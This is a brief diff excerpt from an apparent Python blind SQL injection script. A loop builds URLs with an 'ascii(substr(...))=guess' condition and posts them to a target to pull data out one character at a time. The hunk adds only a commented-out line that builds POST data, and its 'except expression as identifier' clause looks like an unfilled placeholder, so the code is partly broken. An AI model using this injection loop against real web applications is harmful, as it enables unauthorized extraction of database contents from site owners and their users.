@@ -44,6 +44,7 @@ for length in range(1,99):
         curl = f"""{url} and ascii(substr(({query_sql}),{length},1))={guess}"""
         try:
             # result = req.post(url=curl, data=data, headers=headers, cookies=cookies)
+            # postdata = "&".join("%s=%s" % (k,v) for k,v in data.items())
             result = req.post(url=curl, data=data, headers=headers)
         except expression as identifier:
             continue
